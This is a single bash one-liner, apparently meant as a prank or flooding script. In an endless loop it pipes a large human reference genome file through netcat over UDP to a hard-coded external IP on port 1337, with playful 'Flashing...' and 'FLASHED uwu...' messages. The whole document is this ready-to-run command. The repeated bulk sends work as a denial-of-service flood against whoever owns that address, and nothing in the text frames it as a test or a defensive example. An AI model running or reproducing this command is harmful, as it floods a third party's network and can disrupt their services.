while true; do  echo "Flashing..." && (cat ./GRCh38_latest_genomic.fna | nc -u 176.106.59.11 1337; sleep 1) &&  echo "FLASHED uwu..."; done;
